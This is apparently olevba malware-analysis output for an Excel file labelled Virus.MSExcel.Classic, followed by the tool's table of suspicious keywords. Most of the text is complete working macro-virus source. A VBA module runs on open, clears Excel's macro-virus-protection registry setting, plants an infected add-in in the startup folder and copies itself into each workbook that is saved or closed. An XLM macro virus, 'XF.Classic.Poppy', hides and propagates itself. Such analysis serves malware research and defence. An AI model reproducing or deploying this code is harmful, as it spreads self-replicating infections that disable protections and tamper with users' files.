olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Classic-1159111237c11fef9de0c3fa6f6e5a5aaee567d7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Classic-1159111237c11fef9de0c3fa6f6e5a5aaee567d7 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit



Private Const cstrSection     As String = "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
Private Const cstrEngine      As String = "874.XLS"
Private Const cstrModule      As String = "ThisWorkbook"
Private Const cstrKeyName     As String = "Options6"
Private Const cstrVolumeData  As String = "IVID"

Private Declare Function GetVolumeInformation Lib "KERNEL32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As Long, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As Long, ByVal nFileSystemNameSize As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKeyEx Lib "ADVAPI32.DLL" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "ADVAPI32.DLL" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long
Private Declare Function RegSetValueEx Lib "ADVAPI32.DLL" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long

Private WithEvents mapp As Application



Private Sub Workbook_Open()
  Dim strEngine     As String
  Dim wbkEngine     As Workbook
  Dim cmdEngine     As Object
  Dim lngRegKey     As Long
  Dim lngRegType    As Long
  Dim lngRegValue   As Long
  Dim lngVolumeID   As Long
  On Error Resume Next
  If (RegOpenKeyEx(&H80000001, cstrSection, 0, &H2001F, lngRegKey) = 0) Then
    RegQueryValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue, 4
    RegSetValueEx lngRegKey, cstrKeyName, 0, lngRegType, lngRegValue And Not 8, 4
    RegCloseKey lngRegKey
  End If
  strEngine = UCase$(Application.StartupPath + "\" + cstrEngine)
  If UCase$(Me.FullName) = strEngine Then
    Set mapp = Application
  ElseIf Len(Dir(strEngine)) = 0 Then
    Application.ScreenUpdating = False
    If Len(Dir(Application.StartupPath, vbDirectory)) = 0 Then MkDir Application.StartupPath
    Set wbkEngine = Workbooks.Add
    wbkEngine.IsAddin = True
    Intrude wbkEngine
    GetVolumeInformation Left$(strEngine, InStr(1, strEngine, "\")), 0, 0, lngVolumeID, 0, 0, 0, 0
    wbkEngine.CustomDocumentProperties.Add cstrVolumeData + Hex$(lngVolumeID), False, msoPropertyTypeString, ""
    wbkEngine.SaveAs strEngine, xlAddIn
    wbkEngine.Close
    If (lngRegValue And 8) = 8 Then
      Set cmdEngine = Me.VBProject.VBComponents(cstrModule).CodeModule
      cmdEngine.DeleteLines 1, cmdEngine.CountOfLines
      Me.Save
    End If
    Application.ScreenUpdating = True
  Else
    CopyVolumesData Workbooks(cstrEngine)
  End If
End Sub

Private Sub mapp_WorkbookBeforeSave(ByVal Wb As Excel.Workbook, ByVal SaveAsUI As Boolean, Cancel As Boolean)
  On Error Resume Next
  Intrude Wb
End Sub

Private Sub mapp_WorkbookBeforeClose(ByVal Wb As Excel.Workbook, Cancel As Boolean)
  On Error Resume Next
  If Len(Wb.Path) <> 0 Then If Intrude(Wb) Then Wb.Save
End Sub

Private Function Intrude(wbkTarget As Workbook) As Boolean
  Dim cmdSource As Object
  Dim cmdTarget As Object
  On Error Resume Next
  Intrude = False
  Set cmdSource = Me.VBProject.VBComponents(cstrModule).CodeModule
  Set cmdTarget = wbkTarget.VBProject.VBComponents(cstrModule).CodeModule
  If cmdTarget.CountOfLines <= 2 Then
    cmdTarget.DeleteLines 1, cmdSource.CountOfLines
    cmdTarget.AddFromString cmdSource.Lines(1, cmdSource.CountOfLines)
    CopyVolumesData wbkTarget
    Intrude = True
  End If
End Function

Private Sub CopyVolumesData(wbkTarget As Workbook)
  Dim pptVolume As DocumentProperty
  On Error Resume Next
  For Each pptVolume In Me.CustomDocumentProperties
    If Left$(pptVolume.Name, Len(cstrVolumeData)) = cstrVolumeData Then
      wbkTarget.CustomDocumentProperties.Add pptVolume.Name, False, pptVolume.Type, ""
      wbkTarget.CustomDocumentProperties(pptVolume.Name).Value = pptVolume.Value
    End If
  Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Classic-1159111237c11fef9de0c3fa6f6e5a5aaee567d7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Classic-1159111237c11fef9de0c3fa6f6e5a5aaee567d7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Classic-1159111237c11fef9de0c3fa6f6e5a5aaee567d7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Classic-1159111237c11fef9de0c3fa6f6e5a5aaee567d7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Classic-1159111237c11fef9de0c3fa6f6e5a5aaee567d7 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  000
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  100
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  VXXXX
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - üÈÝÐ
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - „Ç 
' 0085     16 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, hidden -  XL4Popp
' 0018     23 LABEL : Cell Value, String Constant - built-in-name 2 Auto_Close len=7 ptgRef3d  100!C4 
' 0018     23 LABEL : Cell Value, String Constant - built-in-name 1 Auto_Open len=7 ptgRef3d  100!C4 
' 0018     26 LABEL : Cell Value, String Constant - Bust len=7 ptgRef3d  100!C31 
' 0018     30 LABEL : Cell Value, String Constant - Continue len=7 ptgRef3d  100!C9 
' 0018     77 LABEL : Cell Value, String Constant - Document_array len=8 ptgArrayA  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x02\x00\x00\xb0!\xec\x01'
' 0018     41 LABEL : Cell Value, String Constant - Documents_array len=11 ptgArea3d  *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\x01\x00\x00\x00\x0f\x00\x01\x00\x01\x00'
' 0018     27 LABEL : Cell Value, String Constant - Hello len=7 ptgRef3d  100!A15 
' 0018     28 LABEL : Cell Value, String Constant - MakeIt len=7 ptgRef3d  100!A26 
' 0018     29 LABEL : Cell Value, String Constant - Morning len=7 ptgRef3d  100!C39 
' 0018     27 LABEL : Cell Value, String Constant - Poppy len=7 ptgRef3d  100!C27 
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 002a      2 PRINTHEADERS : Print Row/Column Labels
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' Sheet,Reference,Formula,Value
' üÈÝÐ,C12,"",84851.00000000000000000000
' üÈÝÐ,B16,"",3.00000000000000000000
' üÈÝÐ,B18,"",1.00000000000000000000
' üÈÝÐ,B19,"",7.00000000000000000000
' üÈÝÐ,B25,"",145.00000000000000000000
' üÈÝÐ,B28,"",1.00000000000000000000
' üÈÝÐ,B29,"",4.00000000000000000000
' üÈÝÐ,B30,"",1.00000000000000000000
' „Ç ,G13,"",1.00000000000000000000
' „Ç ,H13,G13/D13,""
' „Ç ,I13,G13-F13,""
' „Ç ,J13,L13+K13,""
' „Ç ,L13,"",1.00000000000000000000
' „Ç ,M13,N13+O13,""
' „Ç ,N13,"",1.00000000000000000000
' „Ç ,P13,Q13+R13,""
' „Ç ,B21, 000!C12,""
'  XL4Popp,C1,WORKBOOK.HIDE("XL4Poppy"),""
'  XL4Popp,C4,RUN(C18),""
'  XL4Popp,C5,"ERROR(TRUE,Continue)",""
'  XL4Popp,C6,IF(A4=3),""
'  XL4Popp,C7,RETURN(),""
'  XL4Popp,C8,*STACKERROR* not enough arguments for function: END.IF,""
'  XL4Popp,C9,ERROR(FALSE),""
'  XL4Popp,C10,RUN(A21),""
'  XL4Popp,C11,"ON.TIME("6:30:00 PM","Hello")",""
'  XL4Popp,C12,"ON.TIME("6:30:00 AM","Morning")",""
'  XL4Popp,C13,"ON.SHEET(,"Poppy",TRUE)",""
'  XL4Popp,C14,RETURN(),""
'  XL4Popp,A15,"ALERT("XF.Classic.Poppy by VicodinES",2)",""
'  XL4Popp,A16,"ALERT("Ò$  1 9 9 8   T h e   N a r k o t i c   N e t w o r k ",2)",""
'  XL4Popp,A17,RETURN(),""
'  XL4Popp,C18,"SET.VALUE(A3,(GET.WORKSPACE(32)&"\xlstart\Book1."))",""
'  XL4Popp,C19,"SET.NAME("Document_array",DOCUMENTS())",""
'  XL4Popp,C20,"SET.VALUE(A1,INDEX(Document_array,2))",""
'  XL4Popp,A21,"IF(FILES(A3)="Book1.",0,99)",""
'  XL4Popp,C21,"SET.VALUE(A2,INDEX(Document_array,1))",""
'  XL4Popp,A22,"ERROR(TRUE,MakeIt)",""
'  XL4Popp,C22,"SET.VALUE(A4,GET.DOCUMENT(3,"["&A1&"]"&"XL4Poppy"))",""
'  XL4Popp,A23,IF(A21=0),""
'  XL4Popp,C23,RETURN(),""
'  XL4Popp,A24,RETURN(),""
'  XL4Popp,A25,*STACKERROR* not enough arguments for function: END.IF,""
'  XL4Popp,A26,NEW(1),""
'  XL4Popp,A27,WORKBOOK.INSERT(1),""
'  XL4Popp,C27,RUN(C19),""
'  XL4Popp,A28,WORKBOOK.INSERT(1),""
'  XL4Popp,C28,"ERROR(TRUE,Bust)",""
'  XL4Popp,A29,ACTIVATE.PREV(),""
'  XL4Popp,C29,IF(A4=3),""
'  XL4Popp,A30,RUN(C18),""
'  XL4Popp,C30,RETURN(),""
'  XL4Popp,A31,"WORKBOOK.COPY("XL4Poppy",A1)",""
'  XL4Popp,C31,ERROR(FALSE),""
'  XL4Popp,A32,"WORKBOOK.NAME("Sheet3","Sheet99")",""
'  XL4Popp,C32,ACTIVATE.PREV(),""
'  XL4Popp,A33,"WORKBOOK.NAME("Sheet1","Sheet3")",""
'  XL4Popp,C33,RUN(C19),""
'  XL4Popp,A34,"WORKBOOK.NAME("Sheet99","Sheet1")",""
'  XL4Popp,C34,"WORKBOOK.COPY("XL4Poppy",A1)",""
'  XL4Popp,A35,"PROTECT.DOCUMENT(TRUE,,"VicodinES",TRUE)",""
'  XL4Popp,C35,*STACKERROR* not enough arguments for function: END.IF,""
'  XL4Popp,A36,WORKBOOK.PREV(),""
'  XL4Popp,C36,RETURN(),""
'  XL4Popp,A37,WORKBOOK.PREV(),""
'  XL4Popp,A38,WORKBOOK.PREV(),""
'  XL4Popp,A39,SAVE.AS(A3),""
'  XL4Popp,C39,APP.TITLE("XF.Classic.Poppy"),""
'  XL4Popp,A40,FILE.CLOSE(),""
'  XL4Popp,C40,"MESSAGE(TRUE,"VicodinES and Lord Natas greet you a good morning!")",""
'  XL4Popp,A41,RETURN(),""
'  XL4Popp,C41,RETURN(),""
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegOpenKeyEx        |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|RegQueryValueExA    |May read registry keys                       |
|Suspicious|RegQueryValueEx     |May read registry keys                       |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|          |A                   |                                             |
|Suspicious|GetVolumeInformation|May detect Anubis Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ADVAPI32.DLL        |Executable file name                         |
|Suspicious|XLM macro           |XLM macro found. It may contain malicious    |
|          |                    |code                                         |
+----------+--------------------+---------------------------------------------+

